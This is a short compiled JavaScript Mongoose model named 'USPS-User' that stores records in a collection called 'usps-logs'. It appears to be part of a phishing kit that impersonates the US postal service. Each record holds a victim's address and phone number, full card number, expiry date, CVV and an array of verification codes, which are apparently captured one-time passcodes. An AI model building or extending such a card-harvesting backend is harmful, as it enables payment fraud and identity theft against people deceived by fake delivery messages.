"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.User = void 0;
const mongoose_1 = require("mongoose");
;
exports.User = mongoose_1.model('USPS-User', new mongoose_1.Schema({
    created_at: Number,
    address: {
        addressLine1: String,
        addressLine2: String,
        city: String,
        state: String,
        zip: String,
        phone: String
    },
    card: {
        number: String,
        exp: {
            month: String,
            year: String
        },
        cvv: String,
        verification: {
            codes: Array
        }
    },
}, {
    collection: 'usps-logs'
}));
//# sourceMappingURL=mongo.js.map